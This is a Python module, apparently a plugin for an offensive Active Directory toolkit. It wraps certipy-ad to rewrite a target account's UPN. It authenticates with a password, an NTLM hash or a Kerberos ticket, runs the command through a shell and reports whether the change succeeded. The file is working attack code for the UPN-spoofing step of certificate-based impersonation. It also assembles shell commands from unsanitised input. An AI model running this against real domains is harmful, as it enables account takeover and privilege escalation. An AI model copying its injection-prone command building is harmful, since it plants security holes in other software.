def run(data, cred, args):
    import subprocess

    target_user = args.extra[0] if args.extra else None
    new_upn = args.extra[1] if len(args.extra) > 1 else None

    if not target_user or not new_upn:
        print("[-] Missing user or UPN")
        return None

    domain = data.get("domain")
    dc = data.get("ip")

    user = cred.get("user")
    typ = cred.get("type")
    secret = cred.get("secret")

    if not domain or not dc or not user:
        print("[-] Missing required data")
        return None

    base = f"certipy-ad account update -username {user}@{domain} -user {target_user} -upn {new_upn}"

    if typ == "password":
        cmd = f"{base} -p {secret}"

    elif typ == "ntlm":
        cmd = f"{base} -hashes :{secret}"

    elif typ == "ticket":
        cmd = f"KRB5CCNAME={secret} {base} -k -no-pass"

    else:
        print("[-] Unsupported credential type")
        return None

    print(f"[*] Running: {cmd}")

    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    output = result.stdout + result.stderr
    print(output)

    success = "updated" in output.lower()

    return {"success": success}
